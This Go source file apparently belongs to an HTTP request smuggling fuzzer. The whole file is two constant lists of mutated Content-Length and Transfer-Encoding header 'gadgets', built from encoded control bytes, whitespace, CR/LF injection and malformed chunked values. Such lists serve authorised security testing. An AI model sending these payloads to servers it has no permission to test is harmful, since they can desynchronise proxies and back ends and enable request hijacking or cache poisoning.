package smuggle

// DefaultGadgetList contains common HTTP smuggling gadgets
const DefaultGadgetList = `validheader; smugglefuzz
CONTENT-LENGTH; 13
content-lengt%68; 13
content-length; %313
transfer-encoding; chunke%64
transfer-encoding; chunked, chunked
TRANSFER-ENCODING; CHUNKED
transfer-encoding; chunked,identity
transfer-encoding; chunked,chunked
transfer-encoding: gzip, chunked
transfer-encoding: gzip,chunked
transfer-encoding: chunked, gzip
content-length; 13
content-length; %20%20%20%2013
content-length; 13%20%20%20%20
transfer-encoding; chunked
transfer-encoding; ,chunked
transfer-encoding; gzip, chunked
transfer-encoding; \tchunked
transfer-encoding\t; chunked
\ttransfer-encoding; chunked
transfer-encoding; chunked\t
transfer-encoding; chunked\r
transfer-%00encoding; chunked
transfer-%01encoding; chunked
transfer-%13encoding; chunked
content-length; 13\r
content-length; 015
content-length; 013
content-length; 13_0
content-%00length; 13
content-%01length; 13
content-%13length; 13
content-length; 13\r
transfer_encoding; chunked
content_length; 13
contentlength; 13
transferencoding; chunked
Content-Length; 13
content-length; "13"
content-length; '13'
content-length; +13
content-length; -13
Transfer-Encoding; chunked
Transfer-Encoding; chunked, identity
Transfer-Encoding; chunked,
Transfer-Encoding; , chunked
Transfer-Encoding; identity, chunked
Transfer-Encoding; Chunked
transfer-encoding; chunked
transfer-encoding; chunked, identity
transfer-encoding; chunked,
transfer-encoding; , chunked
transfer-encoding; ,chunked
transfer-encoding; chunked,
transfer-encoding; identity, chunked
transfer-encoding; Chunked
Transfer-Encoding; chunked\r\nxxx: yyy
Transfer-Encoding; chunked\nxxx: yyy
transfer-encoding; chunked\r\nxxx: yyy
content-length; 13\r\nxxx: yyy
content-length; 13\nxxx: yyy
transfer-encoding; "chunked"
transfer-encoding; 'chunked'
transfer-encoding; chunk
xxxx: yyy\r\ncontent-length; 13
xxxx: yyy\ncontent-length; 13
xxxx; yyy\r\ncontent-length: 13
xxxx; yyy\r\ntransfer-encoding: chunked
xxxx; yyy\ntransfer-encoding: chunked
transfer; encoding: chunked
xxxx; transfer-encoding: chunked
content-length%01; 13
%01content-length; 13
content-length; %0113
content-length; 13%01
%01transfer-encoding; chunked
transfer-encoding%01; chunked
transfer-encoding; chunked%01
transfer-encoding; %01chunked
content-length%00; 13
%00content-length; 13
content-length; %0013
content-length; 13%00
%00transfer-encoding; chunked
transfer-encoding%00; chunked
transfer-encoding; chunked%00
transfer-encoding; %00chunked`

// ExtendedGadgetList contains an extended set of HTTP smuggling gadgets
const ExtendedGadgetList = DefaultGadgetList + `
content-length%04; 13
%04content-length; 13
content-length; %0413
content-length; 13%04
%04transfer-encoding; chunked
transfer-encoding%04; chunked
transfer-encoding; chunked%04
transfer-encoding; %04chunked
content-length%08; 13
%08content-length; 13
content-length; %0813
content-length; 13%08
%08transfer-encoding; chunked
transfer-encoding%08; chunked
transfer-encoding; chunked%08
transfer-encoding; %08chunked
content-length%0A; 13
%0Acontent-length; 13
content-length; %0A13
content-length; 13%0A
%0Atransfer-encoding; chunked
transfer-encoding%0A; chunked
transfer-encoding; chunked%0A
transfer-encoding; %0Achunked
content-length%0B; 13
%0Bcontent-length; 13
content-length; %0B13
content-length; 13%0B
%0Btransfer-encoding; chunked
transfer-encoding%0B; chunked
transfer-encoding; chunked%0B
transfer-encoding; %0Bchunked
content-length%0C; 13
%0Ccontent-length; 13
content-length; %0C13
content-length; 13%0C
%0Ctransfer-encoding; chunked
transfer-encoding%0C; chunked
transfer-encoding; chunked%0C
transfer-encoding; %0Cchunked
content-length%0D; 13
%0Dcontent-length; 13
content-length; %0D13
content-length; 13%0D
%0Dtransfer-encoding; chunked
transfer-encoding%0D; chunked
transfer-encoding; chunked%0D
transfer-encoding; %0Dchunked
content-length%1F; 13
%1Fcontent-length; 13
content-length; %1F13
content-length; 13%1F
%1Ftransfer-encoding; chunked
transfer-encoding%1F; chunked
transfer-encoding; chunked%1F
transfer-encoding; %1Fchunked
content-length%20; 13
%20content-length; 13
content-length; %2013
content-length; 13%20
%20transfer-encoding; chunked
transfer-encoding%20; chunked
transfer-encoding; chunked%20
transfer-encoding; %20chunked
content-length%7F; 13
%7Fcontent-length; 13
content-length; %7F13
content-length; 13%7F
%7Ftransfer-encoding; chunked
transfer-encoding%7F; chunked
transfer-encoding; chunked%7F
transfer-encoding; %7Fchunked
content-length%A0; 13
%A0content-length; 13
content-length; %A013
content-length; 13%A0
%A0transfer-encoding; chunked
transfer-encoding%A0; chunked
transfer-encoding; chunked%A0
transfer-encoding; %A0chunked
content-length%FF; 13
%FFcontent-length; 13
content-length; %FF13
content-length; 13%FF
%FFtransfer-encoding; chunked
transfer-encoding%FF; chunked
transfer-encoding; chunked%FF
transfer-encoding; %FFchunked
content-length%9D; 13
%9Dcontent-length; 13
content-length; %9D13
content-length; 13%9D
%9Dtransfer-encoding; chunked
transfer-encoding%9D; chunked
transfer-encoding; chunked%9D
transfer-encoding; %9Dchunked
content-length%81; 13
%81content-length; 13
content-length; %8113
content-length; 13%81
%81transfer-encoding; chunked
transfer-encoding%81; chunked
transfer-encoding; chunked%81
transfer-encoding; %81chunked
content-length%5F; 13
%5Fcontent-length; 13
content-length; %5F13
content-length; 13%5F
%5Ftransfer-encoding; chunked
transfer-encoding%5F; chunked
transfer-encoding; chunked%5F
transfer-encoding; %5Fchunked
content-length%5C; 13
%5Ccontent-length; 13
content-length; %5C13
content-length; 13%5C
%5Ctransfer-encoding; chunked
transfer-encoding%5C; chunked
transfer-encoding; chunked%5C
transfer-encoding; %5Cchunked
content-length%90; 13
%90content-length; 13
content-length; %9013
content-length; 13%90
%90transfer-encoding; chunked
transfer-encoding%90; chunked
transfer-encoding; chunked%90
transfer-encoding; %90chunked
content-length%F9; 13
%F9content-length; 13
content-length; %F913
content-length; 13%F9
%F9transfer-encoding; chunked
transfer-encoding%F9; chunked
transfer-encoding; chunked%F9
transfer-encoding; %F9chunked`
